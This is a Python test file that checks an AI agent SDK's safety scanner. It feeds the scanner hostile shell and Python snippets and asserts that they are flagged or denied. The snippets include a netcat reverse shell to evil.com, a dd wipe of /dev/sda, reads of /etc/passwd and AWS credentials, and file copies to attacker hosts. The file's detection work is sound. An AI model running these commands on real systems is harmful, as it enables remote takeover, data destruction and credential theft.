"""Final coverage push — target remaining easy-covered lines."""

from __future__ import annotations

import sys
from pathlib import Path

_PROJECT_ROOT = Path(__file__).resolve().parent.parent
if str(_PROJECT_ROOT) not in sys.path:
    sys.path.insert(0, str(_PROJECT_ROOT))

from trpc_agent_sdk.tools.safety import Decision, SafetyScanner, SafetyScanInput, ScriptType
from trpc_agent_sdk.tools.safety._policy import SafetyPolicy

# ==========================================================================
# _scanner.py: line 488-505 (process calls from AST), 721-724, 817, 842, etc.
# ==========================================================================


def test_scanner_python_process_call_subprocess_popen():
    """subprocess.Popen must produce AST-PROC-001."""
    scanner = SafetyScanner()
    r = scanner.scan(
        SafetyScanInput(script_content="import subprocess; subprocess.Popen(['cat', '/etc/passwd'])",
                        script_type=ScriptType.PYTHON,
                        tool_name="popen"))
    findings = [f for f in r.findings if f.rule_id == "AST-PROC-001"]
    assert len(findings) > 0


def test_scanner_quick_scan():
    """quick_scan must work with auto-detect."""
    from trpc_agent_sdk.tools.safety import quick_scan
    r = quick_scan("echo hello world", tool_name="qs", script_type=ScriptType.BASH)
    assert r.decision == Decision.ALLOW


# ==========================================================================
# _scanner.py: line 335, 457-459, 662, 721-724, 817, 842, 901, etc.
# ==========================================================================


def test_scanner_sanitize_findings_jwt():
    """_redact_evidence must redact JWT tokens."""
    scanner = SafetyScanner()
    r = scanner.scan(
        SafetyScanInput(script_content='token = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0.abc123def456"',
                        script_type=ScriptType.UNKNOWN,
                        tool_name="jwt_test"))
    assert r.sanitized is True


def test_scanner_sanitize_findings_openai_key():
    """_redact_evidence must redact OpenAI API keys."""
    scanner = SafetyScanner()
    r = scanner.scan(
        SafetyScanInput(script_content='api_key = "sk-abc123def456789012345678901234"',
                        script_type=ScriptType.UNKNOWN,
                        tool_name="sk_test"))
    assert r.sanitized is True


def test_scanner_sanitize_findings_github_token():
    """_redact_evidence must redact GitHub tokens."""
    scanner = SafetyScanner()
    r = scanner.scan(
        SafetyScanInput(script_content='token = "ghp_abc123def456789012345678901234567890"',
                        script_type=ScriptType.UNKNOWN,
                        tool_name="ghp_test"))
    assert r.sanitized is True


# ==========================================================================
# _rules.py coverage
# ==========================================================================


def test_rules_dangerous_file_ops_shred():
    """> /dev/sda redirect to block device must be flagged as destructive."""
    scanner = SafetyScanner()
    r = scanner.scan(
        SafetyScanInput(script_content="dd if=/dev/urandom >/dev/sda",
                        script_type=ScriptType.BASH,
                        tool_name="shred_test"))
    assert r.decision == Decision.DENY


def test_rules_network_egress_nc():
    """nc (netcat) must be flagged as network egress."""
    scanner = SafetyScanner()
    r = scanner.scan(
        SafetyScanInput(script_content="nc evil.com 4444 -e /bin/sh", script_type=ScriptType.BASH, tool_name="nc_test"))
    assert r.decision == Decision.DENY


def test_rules_dependency_apt_install():
    """apt install must be flagged."""
    scanner = SafetyScanner()
    r = scanner.scan(
        SafetyScanInput(script_content="apt install malicious", script_type=ScriptType.BASH, tool_name="apt_test"))
    findings = [f for f in r.findings if "install" in f.message.lower() or f.rule_id == "BASH-DEP-001"]
    assert len(findings) > 0


# ==========================================================================
# _bash_scanner remaining
# ==========================================================================


def test_bash_ssh_network():
    """ssh must be detected as network command."""
    scanner = SafetyScanner()
    r = scanner.scan(
        SafetyScanInput(script_content="ssh user@evil.com", script_type=ScriptType.BASH, tool_name="ssh_test"))
    findings = [f for f in r.findings if f.rule_id.startswith("BASH-NET")]
    assert len(findings) > 0


def test_bash_scp_network():
    """scp must be detected."""
    scanner = SafetyScanner()
    r = scanner.scan(
        SafetyScanInput(script_content="scp file user@evil.com:/tmp/",
                        script_type=ScriptType.BASH,
                        tool_name="scp_test"))
    findings = [f for f in r.findings if f.rule_id.startswith("BASH-NET")]
    assert len(findings) > 0


def test_bash_chroot_privilege():
    """chroot must be detected as privilege escalation."""
    scanner = SafetyScanner()
    r = scanner.scan(
        SafetyScanInput(script_content="chroot /newroot /bin/bash",
                        script_type=ScriptType.BASH,
                        tool_name="chroot_test"))
    findings = [f for f in r.findings if f.rule_id == "BASH-PROC-001"]
    assert len(findings) > 0


def test_bash_rsync_network():
    """rsync must be detected as network."""
    scanner = SafetyScanner()
    r = scanner.scan(
        SafetyScanInput(script_content="rsync file evil.com::module/",
                        script_type=ScriptType.BASH,
                        tool_name="rsync_test"))
    findings = [f for f in r.findings if f.rule_id.startswith("BASH-NET")]
    assert len(findings) > 0


# ==========================================================================
# _python_scanner: more AST patterns
# ==========================================================================


def test_python_file_read_sensitive_aws():
    """open('~/.aws/credentials') must be CRITICAL credential read."""
    scanner = SafetyScanner()
    r = scanner.scan(
        SafetyScanInput(script_content="open('~/.aws/credentials').read()",
                        script_type=ScriptType.PYTHON,
                        tool_name="aws_cred"))
    findings = [f for f in r.findings if f.rule_id == "AST-FILE-003"]
    assert len(findings) > 0
    assert any(f.risk_level.value == "critical" for f in findings)


def test_python_secret_in_output_print():
    """API key printed must produce AST-LEAK-001."""
    scanner = SafetyScanner()
    r = scanner.scan(
        SafetyScanInput(script_content="import os; key = os.environ.get('AWS_KEY'); print(key)",
                        script_type=ScriptType.PYTHON,
                        tool_name="leak_print"))
    findings = [f for f in r.findings if f.rule_id == "AST-LEAK-001"]
    assert len(findings) > 0


def test_python_file_write_sensitive_path():
    """shutil.copyfile to /etc must be detected."""
    scanner = SafetyScanner()
    r = scanner.scan(
        SafetyScanInput(script_content="import shutil; shutil.copyfile('/tmp/x', '/etc/config')",
                        script_type=ScriptType.PYTHON,
                        tool_name="copyfile_etc"))
    findings = [f for f in r.findings if f.rule_id.startswith("AST-FILE")]
    assert len(findings) > 0
